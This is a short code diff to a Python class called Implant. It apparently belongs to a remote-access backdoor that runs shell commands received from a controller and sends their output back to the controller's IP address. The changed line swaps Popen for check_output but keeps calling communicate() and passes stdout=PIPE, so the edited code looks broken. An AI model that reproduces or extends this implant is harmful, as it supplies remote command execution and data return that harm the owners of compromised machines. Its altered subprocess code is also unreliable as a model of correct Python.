@@ -22,7 +22,7 @@ class Implant(Host):
             cmd = shellpack['data'].decode()
             # cmds = cmd.split("|")
             #cmd = cmd.split(" ")
-            ps = Popen(cmd,shell=True,stdout=PIPE,stderr=STDOUT)
+            ps = check_output(cmd,shell=True,stdout=PIPE,stderr=STDOUT,timeout=3)
             output = ps.communicate()[0]
             
             self.send(self.controller_ip, "instruction", output)
